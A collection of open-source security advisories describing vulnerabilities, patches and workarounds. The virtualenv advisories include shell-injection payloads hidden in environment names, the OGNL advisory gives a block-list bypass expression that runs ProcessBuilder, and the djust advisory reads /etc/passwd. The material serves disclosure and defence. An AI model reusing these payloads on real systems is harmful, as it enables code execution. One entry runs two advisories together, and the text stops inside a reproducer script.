title: Storybook is a frontend workshop for building user interface components and pages in isolation.
desc: Storybook is a frontend workshop for building user interface components and pages in isolation. From 8.0.0 until 8.6.19, 9.1.21, 10.6.2, and 11.0.0-alpha.6, a malicious website can interact with the preview of a running Storybook development server. Insufficient iframe embedding and message-origin restrictions can allow attacker-controlled events to reach the running preview. A developer must visit the malicious website and interact with the injected interface. The attack can cause unauthorized changes to story files and, if a changed file is later executed by a local runtime, arbitrary code execution with the developer's privileges. This issue is fixed in 8.6.19, 9.1.21, 10.6.2, and 11.0.0-alpha.6.

title: D365 F&O MCP Server is a Model Context Protocol server for querying Dynamics 365 Finance & Operations X++ code and metadata.
desc: D365 F&O MCP Server is a Model Context Protocol server for querying Dynamics 365 Finance & Operations X++ code and metadata. Prior to version 1.11.0, the officially documented Azure one-click deployment uses infrastructure/azuredeploy.json and infrastructure/main.bicep to default the apiKey parameter to an empty string and pass it to the App Service API_KEY setting. With API_KEY unset or empty, src/middleware/apiKeyAuth.ts passes requests through without authentication, while src/index.ts binds the HTTP listener to 0.0.0.0 by default. If the deployer leaves the optional key blank and does not add separate network restrictions or upstream authentication, the resulting public App Service allows unauthenticated JSON-RPC tools/call requests to /mcp. The deployment's MCP_SERVER_MODE=read-only setting does not prevent anonymous access to read/search tools, including search, get_object_info, batch_get_info, extension_info, security_info, find_references, and find_event_handlers, exposing indexed proprietary X++ source snippets and metadata. Exposed information can include business logic, extension and event-handler wiring, security-role and privilege structure, and labels originally indexed from PackagesLocalDirectory. Deployments protected by a configured API key, effective upstream authentication, or network restrictions preventing attacker access are outside this unauthenticated exposure scenario. This issue is fixed in version 1.11.0.

desc: MongoDB Compass improperly escapes certain BSON values when converting a stored view’s aggregation pipeline into editable source. title: Algorithm::UrataniTakeda versions from 0.1.5 before 0.1.7 for Perl allow memory exhaustion via a never-cleared failure shift cache in search.
desc:
Algorithm::UrataniTakeda versions from 0.1.5 before 0.1.7 for Perl allow memory exhaustion via a never-cleared failure shift cache in search.

The failure shift is cached for each pair of trie state and text character in a field of the matcher object, and nothing clears it. A character not seen before at a given state adds an entry that lasts for the life of the matcher.

An attacker who can submit text with many distinct characters to a long-lived matcher can grow its memory with each search.

title: Electron is a framework for writing cross-platform desktop applications using JavaScript, HTML and CSS.
desc: Electron is a framework for writing cross-platform desktop applications using JavaScript, HTML and CSS. Prior to versions 42.11.3, 43.7.0, 44.3.0, and 45.0.0-alpha.5, hid and usb permission checks made from an iframe caused setPermissionCheckHandler to receive the top-level frame's origin and details instead of the requesting frame's. An application that delegated hid or usb to a cross-origin untrusted iframe and allowed device access with origin-based logic could therefore grant that embedded frame access intended for the top-level page. This issue is fixed in versions 42.11.3, 43.7.0, 44.3.0, and 45.0.0-alpha.5.

title: Slack Morphism is a client library for Slack Web/Events API/Socket Mode and Block Kit.
desc: Slack Morphism is a client library for Slack Web/Events API/Socket Mode and Block Kit. Versions 1.0.0 through 2.27.0 expose the correct Slack request HMAC when signature verification fails. For an invalid request, `slack-morphism` computes the correct signature for the attacker-controlled timestamp and request body and stores it in `SlackEventWrongSignatureError.generated_hash`. The error's `Debug` and `Display` representations expose that value, and the default Axum listener error handler logs it at error level. An attacker who can both reach the application's Slack callback endpoint and read its application/service logs can therefore use the verifier as a chosen-message HMAC oracle. The attacker can send an arbitrary request with an invalid signature, recover the correct signature from the resulting log entry, and resend the same request within the five-minute freshness window. The second request passes Slack Morphism's signature verification and reaches the protected application callback without the attacker knowing the Slack signing secret. Version 2.28.0 patches the issue.

title: Lagoon is an application delivery platform for Kubernetes.
desc: Lagoon is an application delivery platform for Kubernetes. Versions prior to 2.33.1 have a vulnerability in the `ssh` service in Lagoon core that would allow an attacker to execute arbitrary code which could lead to, among other things, elevated administrative permissions. It is mitigated by the fact that an attacker must have a Lagoon user account. Exploitation may be detected by checking the container logs of the `ssh` service for: `too many arguments`. The vulnerability was fixed in Lagoon v2.33.2, which is included in the `lagoon/lagoon-core` helm chart v1.62.2. As a workaround, the `ssh` service in Lagoon core can be disabled. The `ssh-portal` service and components are not effected and can continue to be used.

title: The pfSense REST API package is an unofficial, open-source REST and GraphQL API for pfSense CE and pfSense Plus firewalls.
desc: The pfSense REST API package is an unofficial, open-source REST and GraphQL API for pfSense CE and pfSense Plus firewalls. A privilege escalation vulnerability in pfSense-pkg-RESTAPI prior to version 2.9.0 allows authenticated accounts holding the dedicated settings sync permission to modify REST API configuration secrets. This enables a non-administrative user to elevate their privileges to a full administrator. pfSense-pkg-RESTAPI 2.9.0 patches the issue. Access to the HA settings sync endpoint now strictly requires full administrative privileges (`page-all`). The sub-administrative sync privilege has been removed in versions v2.9.0 and later. In addition to correcting the access control boundary, version 2.9.0 includes the following hardening measures: opt-in default and format and validation modernization. As a workaround, one may mitigate exposure by taking either or all of the following steps. Revoke Scoped Permissions: Remove the `api-v2-system-restapi-settings-sync-post` privilege from all non-administrative users. Apply ACLs: Configure REST API Access Control Lists (ACLs) and/or firewall rules to restrict access to API endpoints exclusively to trusted administrator and HA peer IP addresses.

title: virtualenv activation scripts run code from a path that contains a placeholder name
desc:
### Impact

`ViaTemplateActivator.instantiate_template` replaces the placeholders in an activation template one key at a time, each across the whole text. When a value that it already substituted and quoted contains the name of a later placeholder, the later pass rewrites that name inside the quoted literal. The inserted value brings its own quotes, which close the outer literal, and the rest of the path runs as code when a user activates the environment.

`__VIRTUAL_NAME__` holds the environment's directory name, so a destination such as `A__VIRTUAL_NAME__B/x'$(touch PWNED)'y` is enough. In the default `activate` for bash, the `VIRTUAL_ENV` line renders as:

```sh
VIRTUAL_ENV='/tmp/t/A'x'"'"'$(touch PWNED)'"'"'y'B/x'"'"'$(touch PWNED)'"'"'y'
```

Sourcing that script runs `touch PWNED`. The same payload in a path without the placeholder name runs nothing. `activate.fish` runs the command the same way, and the reporter also showed Python code execution through `activate.xsh` and `bin/activate_this.py`. In `activate.csh`, a directory named after a prompt display placeholder, such as `__VIRTUAL_PROMPT_DISPLAY_TCSH__`, breaks the script with `Unmatched '''`.

No change to `quote()` can stop this, because the rewrite happens after `quote()` ran; it defeats `shlex.quote` and `repr()` alike.

An attacker needs to influence the destination path or `--prompt`: a CI job or wrapper tool that builds the path from a branch or project name, or a directory in a cloned repository or unpacked archive.

The bug affects versions 20.26.6 through 21.14.1. Version 20.26.6 first quoted template values (#2768) and introduced the per-key loop.

### Patches

Fixed in 21.14.2. Activation scripts now keep a placeholder name in the environment's path or prompt as plain text, and activating the example above runs nothing. Fix: https://github.com/pypa/virtualenv/commit/602b26623a724827ff171bf11fef4ad186d01f74

### Workarounds

Do not create an environment whose path or `--prompt` contains a placeholder name such as `__VIRTUAL_NAME__`, `__VIRTUAL_ENV__` or `__VIRTUAL_PROMPT__`, and inspect the generated activation script before you source one you did not create.

### Credits

Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

title: virtualenv activate.fish runs commands from a path or prompt with a backslash before a quote
desc:
### Impact

`FishActivator` defines no `quote()`, so it inherits `ViaTemplateActivator.quote`, which returns `shlex.quote(string)`. That function follows POSIX `sh` rules, where a backslash inside single quotes stays a literal character. fish reads `\'` inside single quotes as an escaped quote and `\\` as an escaped backslash. A value with a backslash before a quote therefore ends the literal somewhere other than where `shlex.quote` put the end, and fish expands the command substitution that follows.

The environment path reaches `set -gx VIRTUAL_ENV`, and `--prompt` or `VIRTUALENV_PROMPT` reaches `set -gx VIRTUAL_ENV_PROMPT`. For `--prompt "x\'\$(touch PWNED)'\'"`, the generated `activate.fish` contains:

```fish
set -gx VIRTUAL_ENV_PROMPT 'x\'"'"'$(touch PWNED)'"'"'\'"'"''
```

`source bin/activate.fish` runs `touch PWNED`, and fish prints no error. The same payload as a directory name runs through `VIRTUAL_ENV`. `--prompt .` takes the current directory's name, so running virtualenv inside a directory someone else named is enough. Without the backslash the payload runs nothing, and under bash it runs nothing either.

virtualenv generates `activate.fish` by default. An attacker needs to influence the environment path or prompt: a CI job or wrapper tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.

The bug affects every release up to 21.14.1 that ships `activate.fish`. The GHSA-p58f-9548-mpm2 fix in 21.7.13 moved the placeholders outside their quotes but kept `shlex.quote`.

### Patches

Fixed in 21.14.2. `activate.fish` now escapes backslashes and single quotes the way fish reads them, so the example above runs nothing and shows the prompt as given. Fix: https://github.com/pypa/virtualenv/commit/3bddeaf8d02c3ee7f576503efb082f8f494cfcab

### Workarounds

Do not create an environment whose path or prompt contains a backslash, and inspect `activate.fish` before you source one you did not create.

### Credits

Kevin Stubbings (@Kwstubbs) of GitHub Security Lab reported this issue.

title: djust: Arbitrary absolute-path file read in the find_handlers_for_template MCP tool
desc:
### Affected version / file / line
Version: djust v1.1.4 (latest release, published 2026-09-23). File: python/djust/mcp/server.py:354-433 (MCP tool find_handlers_for_template). Confirmed identical on the commit used for triage, a7e4fafd1667b4db0b1465652d4a63cb17117a07.

### Description
```
@mcp.tool()
def find_handlers_for_template(template_path: str) -> str:
    """
    Args:
        template_path: Either a logical template name (e.g.
            'demos/counter.html' — what you'd pass to `render`) OR
            an absolute filesystem path. Both are searched.
    """
    ...
    resolved_path: str | None = None
    if os.path.isabs(template_path) and os.path.isfile(template_path):
        resolved_path = template_path
    else:
        ...  # logical-name resolution via Django's template loader
    ...
    with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
        source = f.read()
    handler_names_in_template = sorted({m.group(2) for m in dj_event_attr_re.finditer(source)})
```
When template_path is an absolute path to an existing file, it is used directly, with no confinement to the project/template directories — no realpath() + prefix check, no allowlist. open(resolved_path, ...) then reads the file.

This is inconsistent with the sibling tool in the same file (loaddata, ~line 290-303), which explicitly rejects paths outside the project directory for its own path-like parameter:
```
candidate = os.path.realpath(...)
if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
    return json.dumps({"error": f"fixture path '{p}' resolves outside the project directory", ...})
```
find_handlers_for_template has no equivalent check for template_path before the open() call.

### Impact
An MCP client with access to this tool (available whenever the Django project is running the MCP server via python manage.py djust_mcp — no separate opt-in flag gates this specific tool beyond that) can read the contents of any file on disk that the process has read permission to and that exists, by passing an absolute path — e.g. /etc/passwd, application .env files, SSH keys, or any other sensitive file reachable by the server process's user.

Mitigating factor (reduces this from High to Medium): the tool does not return the raw file content. It runs one fixed regex (dj-(?:click|submit|change|input|keydown|keyup)\s*=\s*['"]([^'"]+)['"]) against the content and returns only the matched handler-name strings, plus confirmation that the file exists and is readable (an existence/readability oracle on its own, independent of the regex match). If the targeted file happens to contain text matching that HTML-attribute-like pattern (plausible for config files, logs, or any text file with key="value"-shaped content), those substrings are returned in full — so the read is not purely blind, but it is not a general-purpose arbitrary-file-read primitive either.

Proof of Concept / Reproduction
Traced via direct source read; no live Django project was exercised for this report (would require a full djust project scaffold, which was out of scope for this pass — see limitation below).

1. MCP client calls: find_handlers_for_template(template_path="/etc/passwd")
2. server.py ~line 393:
    ```
       if os.path.isabs(template_path) and os.path.isfile(template_path):
           resolved_path = template_path
    ```
   resolved_path == "/etc/passwd", unchanged, unconfined
3. server.py ~line 430:
    ```
       with open(resolved_path, "r", encoding="utf-8", errors="replace") as f:
           source = f.read()
   ```
   /etc/passwd is now fully read into `source`
4. The regex dj_event_attr_re.finditer(source) is applied to the real
   /etc/passwd content. /etc/passwd will not match this specific pattern, so
   the response would report an empty handler list plus "file exists and was
   read" - which already confirms the path-confinement bypass (compare with
   passing a nonexistent absolute path, which correctly returns
   "Template file not found").
5. On a target where the absolute path points to a file that DOES contain
   text shaped like `dj-click="..."` (e.g. a copied HTML fragment, a stray
   config value, or a crafted file placed by the attacker via another
   vector), the matched substrings are returned verbatim in the JSON
   response - full-content disclosure of just those substrings, not the
   whole file.

### Suggested Fix
Apply the same confinement loaddata already uses, before the os.path.isfile check:
```
if os.path.isabs(template_path):
    candidate = os.path.realpath(template_path)
    if base_dir and not candidate.startswith(os.path.realpath(str(base_dir))):
        return json.dumps({
            "error": f"template path '{template_path}' resolves outside the project directory",
            "resolved": candidate,
            "project_dir": str(base_dir),
        })
    if os.path.isfile(candidate):
        resolved_path = candidate
```
### Limitations
Not exercised against a live Django/djust project — this is a source-level trace of the exact executed branch (os.path.isabs + os.path.isfile + open()), not an end-to-end runtime capture.
Did not verify whether any MCP-host-level confirmation/approval step (some MCP clients prompt the user before a tool call with a suspicious-looking path argument) would intercept this in practice - the vulnerability is in the server's own missing server-side guard regardless of client-side UX.

### Disclosure Timeline
2026-09-24: found during  audit, confirmed via source trace to the open() sink; classified Medium due to the response-content limitation (matched substrings only, not raw file content).
Please check the log file, and apply CVE once the fix is made.

```
log:
10  14:53:20.185935 openat(AT_FDCWD, "/case/project/templates/nonexistent_inside_project.html", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
10  14:53:20.187205 write(1, "{\"error\": \"Could not resolve tem"..., 204) = 204
   ...
10  14:53:20.191831 write(1, "=== ATTACK: absolute path OUTSID"..., 57) = 57
10  14:53:20.194864 write(1, "target path:", 12) = 12
10  14:53:20.198521 write(1, "/case/outside/evil_content.html", 31) = 31
10  14:53:20.202290 newfstatat(AT_FDCWD, "/case/outside/evil_content.html", {st_mode=S_IFREG|0777, st_size=185, ...}, 0) = 0
10  14:53:20.203762 write(1, "exists on disk (from the contain"..., 42) = 42
10  14:53:20.207224 write(1, "True", 4) = 4
10  14:53:20.210392 newfstatat(AT_FDCWD, "/case/outside/evil_content.html", {st_mode=S_IFREG|0777, st_size=185, ...}, 0) = 0
10  14:53:20.211721 newfstatat(AT_FDCWD, "/case/outside/evil_content.html", {st_mode=S_IFREG|0777, st_size=185, ...}, 0) = 0
10  14:53:20.213284 openat(AT_FDCWD, "/case/outside/evil_content.html", O_RDONLY|O_CLOEXEC) = 3
10  14:53:20.215202 newfstatat(3, "", {st_mode=S_IFREG|0777, st_size=185, ...}, AT_EMPTY_PATH) = 0
10  14:53:20.216994 ioctl(3, TCGETS, 0x7ffd68e26aa0) = -1 ENOTTY (Inappropriate ioctl for device)
10  14:53:20.221797 read(3, "<html><body>\n<!-- This file live"..., 186) = 185
10  14:53:20.223610 read(3, "", 1) = 0
10  14:53:20.224913 close(3) = 0
```
## Maintainer assessment
The djust MCP server (`manage.py djust_mcp`, `python -m djust.mcp`) only serves stdio to the MCP client that launched it, as the same OS user, on the developer's machine; there is no network listener. The realistic caller is a local AI agent acting on untrusted input. The tool returns only `dj-*`-attribute-shaped substrings and an existence answer, not file contents. We therefore rate this Low (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N, 3.3).

Affected: every release with the tool, 0.9.0 – 1.0.9, 1.1.0 – 1.1.6, 1.2.0 – 1.2.3, 1.3.0rc4 – 1.3.0rc7.

## Patches
Fixed in 1.0.10, 1.1.7, 1.2.4 and 1.3.0rc8. `find_handlers_for_template` reads an absolute path only when it resolves (symlinks and `..` followed) inside a directory the template loaders serve or inside `BASE_DIR`, and answers any other absolute path like a missing template. The `seed_fixtures` guard compared paths with a string prefix (so `/app-data` passed for a `BASE_DIR` of `/app`) and skipped the check when `BASE_DIR` was unset; it now compares whole path components and refuses without `BASE_DIR`. Both use one containment helper.

## Workarounds
Run the MCP server only in projects whose agent you trust with file access, or pass logical template names only.

title: OGNL stricter-invocation block list bypass via java.lang.reflect reflection proxies
desc:
### Summary

OGNL's optional *stricter invocation* mode maintains a block list that prevents expressions from directly calling methods on dangerous classes such as `Runtime`, `ProcessBuilder`, and `ClassLoader`. The block list filters on the **declaring class of the method OGNL invokes**. Because `java.lang.reflect.Method` (and `Constructor`/`Field`) are not on the list, an expression can use reflection as a proxy — `someMethod.invoke(target, args)` — to reach a blocked method. The real call (e.g. `ProcessBuilder.start()`) then executes inside the JDK reflection machinery and never passes back through OGNL's `invokeMethod`, so the block list never sees it.

### Proof of concept

Under the default OGNL context (public-only access, stricter invocation enabled), the following expression creates a file even though a direct `new ProcessBuilder(...).start()` is blocked:

```
(#pb=new java.lang.ProcessBuilder({"/usr/bin/touch","rce-proof.txt"}),
 #methods=@java.lang.ProcessBuilder@class.getMethods(),
 #names=#methods.{ #this.getName() },
 #startIdx=#names.indexOf("start"),
 #methods[#startIdx].invoke(#pb, null))
```

### Impact and scope — please read carefully

**This is hardening of a defense-in-depth secondary layer, not a break of OGNL's primary security boundary.**

In OGNL the stricter-invocation block list is a *secondary* mitigation. The **primary** access-control gate is the `MemberAccess` implementation supplied by the integrating framework or application, which OGNL consults on every constructor and method call. Frameworks that evaluate untrusted expressions are expected to install a restrictive `MemberAccess` — for example, Apache Struts' `SecurityMemberAccess`, which excludes dangerous classes and the `java.lang.reflect` package. Against such a `MemberAccess` this PoC is blocked at the very first step (the `new ProcessBuilder(...)` constructor), before reflection is ever reachable.

The default context that ships with OGNL intentionally allows all public members and is **not** designed to sandbox untrusted input. An application that evaluates attacker-controlled expressions with that permissive default already has many paths to code execution, and this technique is not required to achieve it.

**You are affected only if all of the following hold:** (1) your application evaluates untrusted/attacker-controlled OGNL expressions, (2) it uses OGNL's default permissive `MemberAccess` (or an equivalently permissive one that allows `java.lang.reflect`), and (3) it relies on the stricter-invocation block list as its sandbox. **Properly configured consumers — including Apache Struts with its `SecurityMemberAccess` — are not affected.** The actual protection for untrusted-expression scenarios remains a correctly configured `MemberAccess`; the block list should not be treated as a sandbox.

### Fix

`java.lang.reflect.Method`, `java.lang.reflect.Constructor`, and `java.lang.reflect.Field` are added to the stricter-invocation block list, so reflection objects can no longer be used as invocation proxies in stricter mode. The `java.lang.invoke.MethodHandle` path was verified not to be exploitable (its signature-polymorphic `invoke`/`invokeExact` fail through OGNL's reflection-based invocation), so no additional classes are required.

### Credit

Reported responsibly through Tidelift by 毛锐 (youyi.mr@alibaba-inc.com).

title: Moov signedxml: Unauthenticated denial of service in exclusive XML canonicalization
desc:
Exclusive XML canonicalization (`http://www.w3.org/2001/10/xml-exc-c14n#`) in `github.com/moov-io/signedxml` copied the entire accumulated namespace map at every node during `ValidateReferences()`, before any reference digest or signature check.

For a chain of nested elements that each declare many unused namespace prefixes, that produced **O(m × depth²)** time and peak memory (`m` = prefixes per level). `beevik/etree` caps tree depth (~1024), but `m` is unbounded, so a small attacker-controlled document (on the order of 1 MB) could drive multi-gigabyte allocations and OOM the process. No valid signature, matching certificate, or authentication is required.

This is the library’s core path for SAML / WS-Federation service providers, which canonicalize attacker-supplied XML prior to authentication.

### Affected

- Package: `github.com/moov-io/signedxml`
- Function: `ExclusiveCanonicalization` (`exclusivecanonicalization.go`)
- Verified: **v1.4.0** and current default branch (commit `d79064a`). Earlier v1.2.x–v1.3.x releases are likely affected.
 

### Remediation

Do not copy the whole namespace map per node. Maintain a single scope and push/pop only the prefixes introduced at each element. Replace linear prefix-in-scope scans with set lookups. Impose a defensive cap on in-scope namespace declarations and return an error rather than allocating unbounded memory.

From @shuji-oh 
```
Thanks for the fix — I re-ran my PoC against this branch and confirmed the memory blowup is gone.

Before (main)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=     45MB
depth=500  m=10  payload=  0.14MB allocated=    179MB
depth=1000 m=10  payload=  0.27MB allocated=    711MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=    377MB
depth=1000 m=100 payload=  2.57MB allocated=   6278MB
After (fix/exc-c14n-namespace-dos)

-- Doubling depth each time (m=10 fixed): allocated grows ~4x each time ≈ O(depth^2) --
depth=250  m=10  payload=  0.07MB allocated=      2MB
depth=500  m=10  payload=  0.14MB allocated=      4MB
depth=1000 m=10  payload=  0.27MB allocated=      7MB
-- Increasing m (depth=1000 fixed): allocated scales roughly linearly with m --
depth=1000 m=5   payload=  0.16MB allocated=      4MB
depth=1000 m=100 payload=  2.57MB allocated=     47MB
That's roughly a 100–130x reduction in peak allocation for the same payload sizes, and no OOM in any of my runs. This looks like it resolves the issue — thanks for the quick fix!
```

### Credit

Reported by Shuji Ohira ([@shuji-oh](https://github.com/shuji-oh)).

title: OpenChoreo: Authorization bypass on WorkflowRun update allows cross-project takeover of workflow runs
desc:
## Summary

The OpenChoreo API server authorized `PUT .../workflowruns/{runName}` against ownership metadata taken from the request body, while the object it actually mutated was selected by the URL path. Nothing forced the two to agree.

A `WorkflowRun`'s membership in a project and component is carried entirely by its `openchoreo.dev/project` and `openchoreo.dev/component` labels. Because the `workflowrun:update` check read those labels from the submitted object rather than the stored one, a caller holding `workflowrun:update` on one component could name a run belonging to a different project or component in the URL, supply labels for the component they legitimately control, pass the check, and have the unrelated run rewritten with their own ownership labels.

The namespace is taken from the URL and feeds both the authorization check and the Kubernetes read, so it cannot diverge. This is cross-project and cross-component escalation inside a single namespace, not a cross-tenant issue.

## Impact

Rewriting the ownership labels transfers authority over the run. Every other WorkflowRun check (view, logs, events, status, delete, list) derives its scope from the stored labels, so once the write lands the policy engine legitimately grants the attacker access to an object they never had rights to. They can then:

- Read the victim's build logs. These stream raw pod logs from the workflow plane and routinely carry source paths, registry destinations, and credentials a build step echoed by accident.
- Read the run's Kubernetes events.
- Delete the run.

So the primary impact is confidentiality and availability, not only integrity. On the integrity side, `spec.workflow.parameters` can be overwritten on a pending run, and manipulating the two ownership labels can either wedge the run in a permanent `ComponentValidationFailed` condition or downgrade it to a standalone run that skips component validation.

Exploitation requires an authenticated caller with an `AuthzRoleBinding` or `ClusterAuthzRoleBinding` granting `workflowrun:update` at project or component scope in the victim's namespace, plus knowledge of the target run's name. An anonymous caller cannot reach this.

## Patches

The authorization check now loads the stored WorkflowRun and derives every ownership attribute from it instead of from the request body. Separately, the `openchoreo.dev/project` and `openchoreo.dev/component` labels are now immutable on update, so an authorized caller cannot hand their own run to another project either.

| Line | Affected | Fixed in |
|---|---|---|
| 1.0.x | 1.0.0 through 1.0.5 | 1.0.6 |
| 1.1.x | 1.1.0 through 1.1.6 | 1.1.7 |
| 1.2.x | 1.2.0 through 1.2.4 | 1.2.5 |

Upgrade to the patched release on your line. No configuration change is needed after upgrading.

## Workarounds

If you cannot upgrade immediately, restrict who holds `workflowrun:update`.

Audit your `AuthzRole` and `ClusterAuthzRole` definitions for that action and remove it from any role granted to principals you would not trust with write access to every workflow run in the namespace. Among the roles shipped with OpenChoreo, only the system role `workload-publisher` lists `workflowrun:update` explicitly, and `admin` holds it through its `*` wildcard. Custom roles in your own values file may also include it, so check those.

Treat any credential bound to `workload-publisher` as privileged. CI systems are the usual holder, and a leaked CI token is enough to run this.

title: virtualenv activate runs commands from the environment name in zsh with PROMPT_SUBST
desc:
### Impact

zsh users activate an environment with the bash `activate` script, which puts the environment name into `PS1`. Since
21.13.0 the script escapes backslashes, dollar signs and backticks in that name, but only when `BASH_VERSION` is set, so
zsh gets the raw value. With the `PROMPT_SUBST` option set, zsh runs parameter expansion, command substitution and
arithmetic expansion on `PS1` each time it draws the prompt. A name that contains `$(...)`, backticks or `${...}` then
runs as commands in the user's shell, once per prompt.

The name comes from the environment directory, or from `--prompt` or `VIRTUALENV_PROMPT`. After you create an
environment with:

```console
$ virtualenv 'x$(touch PWNED)y'
```

`source 'x$(touch PWNED)y/bin/activate'` in a zsh session with `PROMPT_SUBST` set creates `PWNED`, and the prompt shows
`(xy)`. Passing that value as `--prompt` to an environment with a plain name has the same effect. Without
`PROMPT_SUBST`, zsh shows the name as text and runs nothing. bash runs nothing either.

A plain zsh starts with `PROMPT_SUBST` off. oh-my-zsh users have it on: oh-my-zsh loads
[`lib/theme-and-appearance.zsh`](https://github.com/ohmyzsh/ohmyzsh/blob/4d4cfc287e9d887b81242c0e431b5f49f9cec5c1/lib/theme-and-appearance.zsh#L5)
at startup, and that file sets it. An attacker needs to influence the environment path or prompt: a CI job or wrapper
tool that passes a branch, project or job name through, or a directory in a cloned repository or unpacked archive.
`--prompt .` takes the current directory's name.

zsh also reads `%` in `PS1` as a prompt escape, so a name with `%n` showed the user name in place of those characters,
though without running commands.

The bug is in releases up to and including 21.14.3. The payload runs on 20.26.6 and 21.14.3, and the reporter confirmed
21.9.1.

### Patches

Fixed in 21.14.4. Under zsh, `activate` now escapes the name the way it does under bash and doubles
`%`, so the example above runs nothing and the prompt shows the name as given. zsh gets the escaping even when
`PROMPT_SUBST` is off, because a user can set the option after activation; a name with a backslash, dollar sign or
backtick then shows the added backslashes.
Fix: https://github.com/pypa/virtualenv/commit/5b915367da82bd024b2a0d28d2f98007034b4aa2

### Workarounds

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run
`unsetopt prompt_subst` if your prompt does not need it. Check the name of an environment you did not create before you
source its `activate`.

### Credits

Kaya Emre Arikan (@kemrec) reported this issue.

title: virtualenv bash activate runs commands from an environment name with a backslash before $
desc:
### Summary

The bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a
backslash in the name undoes the escaping and a name containing `\$(...)` runs as commands in the user's shell each
time bash draws the prompt.

### Affected area

`src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.

### Attacker-controlled input

The environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker
needs to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through,
or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.

### Details

bash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\`
into `\` and `\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic
expansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only
for the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before
21.13.0 do not escape the name at all. A bash running as root decodes `\$` to `#`, so the payload shows the wrong text
there but runs nothing. zsh does no decode pass and is not affected.

### Proof of concept

```console
$ virtualenv --prompt 'a\$(touch PWNED)' env
$ bash --norc --noprofile -c 'source env/bin/activate; printf "%s" "${PS1@P}"'
$ ls PWNED
PWNED
```

### Impact

Arbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an
attacker influenced, with that user's privileges, once per prompt draw.

### Versions tested

21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.

### Known mitigation

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars`
if your prompt does not need expansion. Check the name of an environment you did not create before you source its
`activate`.

### Latest release

- [x] The problem reproduces on the latest virtualenv release.

21.14.6

### Patches

Fixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the
example above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs.
Fix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932

### Credits

Found while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.

title: virtualenv: Deletion recovery can change a symlink target's mode
desc:
## Summary

The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows
symlinks. On an eligible unlink failure this can change permissions outside the destination.

Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permission recovery after a filesystem deletion error.

## Attacker-controlled input

A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have
permission to change the target mode. This is conditional error handling, not the normal successful unlink path.

## Affected code

The relevant 21.14.8 source is in
[safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

`safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler
calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's
mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become
`0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;
root does not reach this failure path.

## Reproduction and evidence

The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to
the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and
`virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the
key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the
key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.

This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the
widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to
#3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on
deletion failure and handles Windows read-only entries without following reparse points.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared read-only venv tree
    participant V as safe_delete error handler
    participant L as Symlink in venv
    participant K as User's 0400 key
    A->>V: virtualenv venv or --clear venv
    V->>L: unlink fails in 0555 directory
    V->>L: lstat returns link mode 0777
    V->>L: chmod follows symlink
    L->>K: target mode becomes 0777
    V-->>A: retry fails with PermissionError
    Note over K: Other accounts can use new mode if parent paths are traversable
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

NOBODY = 65534

work = Path(tempfile.mkdtemp(prefix="repro-safe-delete-"))
os.chmod(work, 0o755)
os.chown(work, NOBODY, NOBODY)

# the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable
make_archive = [sys.executable, "/tmp/repro.d/make_project_archive.py"]
subprocess.run([*make_archive, work / "read-only.tar", "555"], check=True)
